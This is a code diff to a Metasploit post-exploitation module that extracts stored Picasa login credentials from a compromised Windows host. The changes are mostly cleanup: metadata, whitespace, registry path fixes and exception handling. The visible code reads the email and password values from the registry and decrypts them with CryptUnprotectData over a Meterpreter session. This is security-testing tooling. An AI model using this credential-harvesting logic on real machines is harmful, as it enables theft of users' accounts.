@@ -24,6 +24,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -55,7 +60,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(512)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+    if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
       addr = [mem].pack('V')
       len = [data.length].pack('V')
       ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
@@ -76,8 +81,8 @@ class MetasploitModule < Msf::Post
   def get_registry
     print_status('Looking in registry for stored login passwords by Picasa ...')
 
-    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaEmail') || ''
-    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences\\', 'GaiaPass') || ''
+    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences', 'GaiaEmail') || ''
+    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa2\\Preferences', 'GaiaPass') || ''
 
     credentials = Rex::Text::Table.new(
       'Header' => 'Picasa Credentials',
@@ -104,8 +109,8 @@ class MetasploitModule < Msf::Post
     end
 
     # For early versions of Picasa3
-    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaEmail') || ''
-    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences\\', 'GaiaPass') || ''
+    username = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences', 'GaiaEmail') || ''
+    password = registry_getvaldata('HKCU\\Software\\Google\\Picasa\\Picasa3\\Preferences', 'GaiaPass') || ''
 
     if !username.empty? && !password.empty?
       passbin = [password].pack('H*')
@@ -134,12 +139,12 @@ class MetasploitModule < Msf::Post
     else
       print_status('No Picasa credentials found.')
     end
-  rescue ::Exception => e
+  rescue StandardError => e
     print_error("An error has occurred: #{e}")
   end
 
   def run
-    uid = session.sys.config.getuid  # Decryption only works in context of user's account.
+    uid = session.sys.config.getuid # Decryption only works in context of user's account.
 
     if is_system?
       print_error("This module is running under #{uid}.")
